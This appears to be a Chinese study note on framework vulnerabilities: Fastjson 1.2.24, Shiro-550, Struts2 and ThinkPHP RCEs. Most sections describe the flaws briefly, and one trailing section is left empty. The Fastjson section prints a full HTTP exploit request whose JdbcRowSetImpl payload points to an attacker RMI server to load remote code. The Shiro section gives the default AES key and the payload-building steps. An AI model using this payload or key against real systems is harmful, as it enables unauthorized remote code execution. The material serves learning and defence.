# 🥮 框架漏洞

框架漏洞是指在应用·程序开发过程中使用的开发框架，例如：web应用程序框架，操作系统框架等中存在的安全弱点和漏洞。这些框架能够帮助开发人员能够更快速的构建应用程序，然后这些框架也包含漏洞，导致应用程序容易受到攻击。



## 1.fastjson1.2.24 RCE漏洞

### ①fastjson介绍：

Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。

### ②漏洞介绍：

为了读取并且判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。为了要获得json数据的详细类型，每次都需要读取@type，而@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。所以攻击者只要有rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者的rmi服务器，JNDI接口从攻击者控制的web服务器加载恶意代码并执行，形成了RCE漏洞

### ③漏洞原理：

如果我们可以控制JNDI客户端中传入的URL就可以起一个恶意的RMI，让JNDI来加载我们的恶意类从而起到命令执行。

References：References类有两个属性，className和codebase url，className就是远程引用的类名，codebase决定了我们远程类的位置，当本地classpath中没有找到对应的类，就会去请求codebase地址下的类（codebase支持http协议），此时如果我们将codebase地址下的类换成我们的恶意类，就能让客户端执行。



### ④利用步骤：

1.首先开启HTTP服务器，并将我们的恶意类放在目录下，

2.开启恶意的RMI服务器

3.攻击者控制URI参数，为上一步开启的恶意的RMI服务器地址。

4.恶意RMI服务器返回ReferenceWrapper类

5.目标（JNDI Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类）在实例化时触发静态代码片段中的恶意代码。



### ⑤payload

```
POST / HTTP/1.1
Host: 192.168.103.161:8090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 165
 
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.103.129:9999/TouchFile",
        "autoCommit":true
    }
}
```









***

## 2.shiro-550反序列化漏洞

### ①shiro介绍：

Apache Shiro是一个强大灵活的开源的java安全框架，Shiro可以非常容易地开发出足够好的应用，其不仅可以在JavaSE环境中使用，还可以在JavaEE环境中可以实现认证，授权，加密，会话管理，web集成，缓存等功能。

### ②漏洞介绍：

Apache Shiro漏洞框架提供了记住密码的功能（Remember me），用户登陆成功后会将用户信息加密，加密过程：用户信息->序列化->AES加密->base64编码->Remember me Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie值，并且将加密信息存放在cookie地remember Me字段里面，在服务端收到请求对rememeber Me值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密密钥，那么就可以把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本<=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这样就更容易触发RCE漏洞。所以我们Payload产生的过程就是：命令->序列化->AES加密->base64编码->Remember me Cookie值

### ③漏洞原理：

在未登录的情况下，请求包的cookie中没有rememberme字段，返回set-cookie里也没有deleteme字段。

登陆失败的话，不管有没有勾选rememberme都会返回rememberme=deleteme字段。不勾选Rememberme

登录成功的话，返回包set-cookie中有remember Me=delete字段，但是之后的请求中cookie都不会有cookie字段。

勾选rememberme，登录成功的话，返回包set-cookie里有rememberme=deleteme字段，还会有remember字段，之后的请求中cookue都会有rememberme字段，或者可以在cookie后面自己加一个rememberme=1，看返回包中有没有rememberme=deleteme











***

## 3.struts2反序列化漏洞

### ①漏洞介绍：

由Xstream组件在解析用户提交的xml数据时，rest-plugin会根据url扩展名或者content-type来判断解析方法，并且缺乏适当的输入验证和控制，导致攻击者可以修改orders.xhtml为orders.xml或者修改content-type为application/xml，即可在body中传递xml数据，在xml请求中嵌入特殊的payload，从而利用反序列化漏洞进行远程代码执行。





***

## 4.strutrs2Content-Type注入漏洞

①漏洞介绍

struts2框架在处理HTTP请求中的Content-Type头部时存在的安全问题，Struts2框架负责解析和处理web应用程序中的HTTP请求。其中，他会检查Content-type请求，以确定请求的数据类型。攻击者可以在HTTP请求的Content-Type投不中注入恶意的OGNL表达式，而Struts2会不加验证地执行这些表达式从而允许执行任意代码





***

## 5.ThinkPHP5.0.23远程代码执行漏洞

①漏洞介绍：

获取method方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞





***

## 6.ThinkPHP5.0.22/5.1.29远程代码执行漏洞

①漏洞介绍：

由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下，可以执行任意方法，从而导致远程命令执行漏洞。归根究底就是因为把控制器名字\开头作为类名导致我们可以实例化任意类，后面的payload也是基于此漏洞的利用。





***

7\.





























## 参考门：

[https://m.freebuf.com/articles/web/382415.html](https://m.freebuf.com/articles/web/382415.html)





